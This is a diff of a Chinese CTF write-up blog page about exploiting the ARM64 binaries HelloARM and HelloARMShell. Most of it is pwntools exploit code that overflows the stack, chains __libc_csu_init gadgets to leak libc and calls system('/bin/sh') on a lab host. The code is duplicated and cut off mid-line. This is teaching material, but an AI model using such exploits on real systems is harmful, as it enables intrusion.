-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x29</span>: <span style="color:#75715e"># x24</span>
-        payload <span style="color:#f92672">+=</span> p64(flag_len)
+conn <span style=color:#f92672>=</span> get_sh()
+conn<span style=color:#f92672>.</span>recvline()
+bb <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
+hex_magic <span style=color:#f92672>=</span> bb[<span style=color:#ae81ff>15</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+addr_magic <span style=color:#f92672>=</span> int(hex_magic, <span style=color:#ae81ff>16</span>)
+
+guess_fd <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
+flag_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x20</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>
+
+conn<span style=color:#f92672>.</span>recv()
+conn<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;imlk____________&#39;</span>)
+conn<span style=color:#f92672>.</span>recv()
+payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100</span>)<span style=color:#f92672>.</span>encode() <span style=color:#75715e># 填充</span>
+
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>) <span style=color:#75715e># x29</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AD0</span>) <span style=color:#75715e># x30 for ret to __libc</span>
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x32</span>):
+    <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x0</span>: 
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400730</span>) <span style=color:#75715e># set to write func pointer</span>
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x1</span>: <span style=color:#75715e># addr_magic-0x08 for w</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400760</span>) <span style=color:#75715e># set to read func pointer</span>
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2</span>: <span style=color:#75715e># addr_magic</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># addr_magic-0x28 for x19</span>
 
 
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2a</span>: <span style="color:#75715e"># x29</span>
-        payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2b</span>: <span style="color:#75715e"># x30</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AB0</span>) <span style="color:#75715e"># for ret to __libc stage 2</span>
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2d</span>: <span style="color:#75715e"># x20</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># to compare with x19, mark write() finished</span>
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2e</span>: <span style="color:#75715e"># x21</span>
-        payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2f</span>: <span style="color:#75715e"># x22</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x30</span>: <span style="color:#75715e"># x23</span>
-        payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x31</span>: <span style="color:#75715e"># x24</span>
-        payload <span style="color:#f92672">+=</span> p64(flag_len)
-    <span style="color:#66d9ef">else</span>:
-        payload <span style="color:#f92672">+=</span> p64(i)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x22</span>:<span style=color:#75715e># x29</span>
+        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x23</span>:<span style=color:#75715e># x30</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x25</span>: <span style=color:#75715e># x20</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark read() finished</span>
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x26</span>: <span style=color:#75715e># x21</span>
+        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x27</span>: <span style=color:#75715e># x22</span>
+        payload <span style=color:#f92672>+=</span> p64(guess_fd)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x28</span>: <span style=color:#75715e># x23</span>
+        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x29</span>: <span style=color:#75715e># x24</span>
+        payload <span style=color:#f92672>+=</span> p64(flag_len)
 
-conn<span style="color:#f92672">.</span>send(payload)
 
-<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-    conn<span style="color:#f92672">.</span>recv()
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2a</span>: <span style=color:#75715e># x29</span>
+        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2b</span>: <span style=color:#75715e># x30</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2d</span>: <span style=color:#75715e># x20</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark write() finished</span>
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2e</span>: <span style=color:#75715e># x21</span>
+        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2f</span>: <span style=color:#75715e># x22</span>
+        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x30</span>: <span style=color:#75715e># x23</span>
+        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
+    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x31</span>: <span style=color:#75715e># x24</span>
+        payload <span style=color:#f92672>+=</span> p64(flag_len)
+    <span style=color:#66d9ef>else</span>:
+        payload <span style=color:#f92672>+=</span> p64(i)
+
+conn<span style=color:#f92672>.</span>send(payload)
+
+<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+    conn<span style=color:#f92672>.</span>recv()
 
 </code></pre></div><p>看到flag了：</p>
-<p><img src="/images/blog/66/image-20201019135329078.png" alt="image-20201019135329078"></p>
+<p><img src=/images/blog/66/image-20201019135329078.png alt=image-20201019135329078></p>
 <p>需要注意的是初始化时用<code>alarm()</code>函数，设定了一个定时器，会在1分钟内结束程序，在gdb调试过程中回很难受。可以用ida给程序打patch，把对<code>alarm()</code>的调用换成<code>nop</code></p>
-<h2 id="helloarmshell">HelloARMShell</h2>
-<p>这次我们需要在上一次的基础上get shell，即执行<code>system(&quot;/bin/sh&quot;)</code>。</p>
-<p>首先我们需要准备参数<code>&quot;/bin.sh&quot;</code>和<code>system()</code>函数的地址，我们可以把<code>&quot;/bin.sh&quot;</code>放到第一次输入的<code>name</code>字段，因为<code>name</code>的地址是静态的，会方便很多。</p>
+<h2 id=helloarmshell>HelloARMShell</h2>
+<p>这次我们需要在上一次的基础上get shell，即执行<code>system("/bin/sh")</code>。</p>
+<p>首先我们需要准备参数<code>"/bin.sh"</code>和<code>system()</code>函数的地址，我们可以把<code>"/bin.sh"</code>放到第一次输入的<code>name</code>字段，因为<code>name</code>的地址是静态的，会方便很多。</p>
 <p>至于<code>system()</code>函数的地址，这个程序并没有连接到<code>system()</code>函数，所以无法在plt表中找到对应的项，但是我们可以先获取到<code>.got</code>表中<code> write()</code>函数的 地址，然后通过偏移量算出<code>system()</code>函数的地址。</p>
 <p>偏移量的计算可以在本机通过解析<code>libc.so</code>文件来解决。</p>
 <p>最后，这题的思路主要是：</p>
@@ -388,136 +362,136 @@ conn<span style="color:#f92672">.</span>send(payload)
 <p>最后我们利用<code>__libc_csu_init()</code>函数，调用<code>system()</code>函数，成功get shell</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> sys
-context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
-context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aarch64&#39;</span>
-Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+<span style=color:#f92672>import</span> sys
+context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;debug&#39;</span>
+context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;aarch64&#39;</span>
+Debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
 
-elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./HelloARM&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./lib/libc.so.6&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./HelloARM&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./lib/libc.so.6&#34;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 
-offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>functions[<span style="color:#e6db74">&#39;system&#39;</span>]<span style="color:#f92672">.</span>address <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>functions[<span style="color:#e6db74">&#39;write&#39;</span>]<span style="color:#f92672">.</span>address
-write_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;write&#34;</span>]
-
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_sh</span>(other_libc<span style="color:#f92672">=</span>null):
-    <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;10.104.255.210&#39;</span>, <span style="color:#ae81ff">7777</span>)
-    <span style="color:#75715e"># global libc</span>
-    <span style="color:#75715e"># if args[&#39;REMOTE&#39;]:</span>
-    <span style="color:#75715e">#     if other_libc is not null:</span>
-    <span style="color:#75715e">#         libc = ELF(&#34;./&#34;, checksec = False)</span>
-    <span style="color:#75715e">#     return remote(&#39;10.104.255.210&#39;, 7777)</span>
-    <span style="color:#75715e"># elif Debug:</span>
-    <span style="color:#75715e">#     sh = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;2333&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
-    <span style="color:#75715e">#     log.info(&#39;Please use GDB remote!(Enter to continue)&#39;)</span>
-    <span style="color:#75715e">#     raw_input()</span>
-    <span style="color:#75715e">#     return sh</span>
-    <span style="color:#75715e"># else :</span>
-    <span style="color:#75715e">#     return process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
+offset <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>functions[<span style=color:#e6db74>&#39;system&#39;</span>]<span style=color:#f92672>.</span>address <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>functions[<span style=color:#e6db74>&#39;write&#39;</span>]<span style=color:#f92672>.</span>address
+write_addr <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#34;write&#34;</span>]
 
 
-conn <span style="color:#f92672">=</span> get_sh()
-conn<span style="color:#f92672">.</span>recvline()
-bb <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvline()
-hex_magic <span style="color:#f92672">=</span> bb[<span style="color:#ae81ff">15</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-addr_magic <span style="color:#f92672">=</span> int(hex_magic, <span style="color:#ae81ff">16</span>)
-
-guess_fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
-flag_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>
-
-conn<span style="color:#f92672">.</span>recv()
-conn<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">_______&#39;</span>)
-conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Set your message:&#39;</span>)
-payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()  <span style="color:#75715e"># 填充</span>
-
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)  <span style="color:#75715e"># x29</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AD0</span>)  <span style="color:#75715e"># x30 for ret to __libc</span>
-
-<span style="color:#75715e"># addr_magic-0x10 for w</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400730</span>)  <span style="color:#75715e"># set to write func pointer</span>
-<span style="color:#75715e"># addr_magic-0x08 for r</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400760</span>)  <span style="color:#75715e"># set to read func pointer</span>
-<span style="color:#75715e"># addr_magic</span>
-
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># addr_magic for x19</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># addr_magic + 0x8 for system() address</span>
-<span style="color:#75715e"># addr_magic + 0x10 for arg 0</span>
-a1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode()
-payload <span style="color:#f92672">+=</span> a1
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">0x20</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> len(a1))
-
-<span style="color:#75715e"># x29</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-<span style="color:#75715e"># x30</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AB0</span>)  <span style="color:#75715e"># for ret to __libc stage 2</span>
-<span style="color:#75715e"># padding</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
-<span style="color:#75715e"># x20</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># to compare with x19, mark write() finished</span>
-<span style="color:#75715e"># x21</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-<span style="color:#75715e"># x22</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
-<span style="color:#75715e"># x23</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000411038</span>)
-<span style="color:#75715e"># x24</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">8</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sh</span>(other_libc<span style=color:#f92672>=</span>null):
+    <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.210&#39;</span>, <span style=color:#ae81ff>7777</span>)
+    <span style=color:#75715e># global libc</span>
+    <span style=color:#75715e># if args[&#39;REMOTE&#39;]:</span>
+    <span style=color:#75715e>#     if other_libc is not null:</span>
+    <span style=color:#75715e>#         libc = ELF(&#34;./&#34;, checksec = False)</span>
+    <span style=color:#75715e>#     return remote(&#39;10.104.255.210&#39;, 7777)</span>
+    <span style=color:#75715e># elif Debug:</span>
+    <span style=color:#75715e>#     sh = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;2333&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
+    <span style=color:#75715e>#     log.info(&#39;Please use GDB remote!(Enter to continue)&#39;)</span>
+    <span style=color:#75715e>#     raw_input()</span>
+    <span style=color:#75715e>#     return sh</span>
+    <span style=color:#75715e># else :</span>
+    <span style=color:#75715e>#     return process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
 
 
-<span style="color:#75715e"># x29</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-<span style="color:#75715e"># x30</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AB0</span>) <span style="color:#75715e"># for ret to __libc stage 2</span>
-<span style="color:#75715e"># padding</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
-<span style="color:#75715e"># x20</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># to compare with x19, mark read() finished</span>
-<span style="color:#75715e"># x21</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>)
-<span style="color:#75715e"># x22</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
-<span style="color:#75715e"># x23</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
-<span style="color:#75715e"># x24</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">8</span>)
+conn <span style=color:#f92672>=</span> get_sh()
+conn<span style=color:#f92672>.</span>recvline()
+bb <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
+hex_magic <span style=color:#f92672>=</span> bb[<span style=color:#ae81ff>15</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+addr_magic <span style=color:#f92672>=</span> int(hex_magic, <span style=color:#ae81ff>16</span>)
+
+guess_fd <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
+flag_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x20</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>
+
+conn<span style=color:#f92672>.</span>recv()
+conn<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>_______&#39;</span>)
+conn<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Set your message:&#39;</span>)
+payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100</span>)<span style=color:#f92672>.</span>encode()  <span style=color:#75715e># 填充</span>
+
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)  <span style=color:#75715e># x29</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AD0</span>)  <span style=color:#75715e># x30 for ret to __libc</span>
+
+<span style=color:#75715e># addr_magic-0x10 for w</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400730</span>)  <span style=color:#75715e># set to write func pointer</span>
+<span style=color:#75715e># addr_magic-0x08 for r</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400760</span>)  <span style=color:#75715e># set to read func pointer</span>
+<span style=color:#75715e># addr_magic</span>
+
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)  <span style=color:#75715e># addr_magic for x19</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)  <span style=color:#75715e># addr_magic + 0x8 for system() address</span>
+<span style=color:#75715e># addr_magic + 0x10 for arg 0</span>
+a1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode()
+payload <span style=color:#f92672>+=</span> a1
+payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> ((<span style=color:#ae81ff>0x20</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> len(a1))
+
+<span style=color:#75715e># x29</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+<span style=color:#75715e># x30</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>)  <span style=color:#75715e># for ret to __libc stage 2</span>
+<span style=color:#75715e># padding</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
+<span style=color:#75715e># x20</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)  <span style=color:#75715e># to compare with x19, mark write() finished</span>
+<span style=color:#75715e># x21</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+<span style=color:#75715e># x22</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)
+<span style=color:#75715e># x23</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000411038</span>)
+<span style=color:#75715e># x24</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>8</span>)
 
 
-<span style="color:#75715e"># x29</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-<span style="color:#75715e"># x30</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AB0</span>) <span style="color:#75715e"># for ret to __libc stage 2</span>
-<span style="color:#75715e"># padding</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
-<span style="color:#75715e"># x20</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># to compare with x19, mark read() finished</span>
-<span style="color:#75715e"># x21</span>
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
-<span style="color:#75715e"># x22</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000411080</span>)
-<span style="color:#75715e"># x23</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
-<span style="color:#75715e"># x24</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+<span style=color:#75715e># x29</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+<span style=color:#75715e># x30</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
+<span style=color:#75715e># padding</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
+<span style=color:#75715e># x20</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark read() finished</span>
+<span style=color:#75715e># x21</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
+<span style=color:#75715e># x22</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
+<span style=color:#75715e># x23</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
+<span style=color:#75715e># x24</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>8</span>)
 
 
-conn<span style="color:#f92672">.</span>send(payload)
-conn<span style="color:#f92672">.</span>recv()
-addr_libc_write <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(numb<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+<span style=color:#75715e># x29</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
+<span style=color:#75715e># x30</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
+<span style=color:#75715e># padding</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
+<span style=color:#75715e># x20</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark read() finished</span>
+<span style=color:#75715e># x21</span>
+payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
+<span style=color:#75715e># x22</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000411080</span>)
+<span style=color:#75715e># x23</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
+<span style=color:#75715e># x24</span>
+payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
 
-print(<span style="color:#e6db74">&#34;addr_libc_write: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(addr_libc_write[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()))
-addr_libc_system <span style="color:#f92672">=</span> p64(
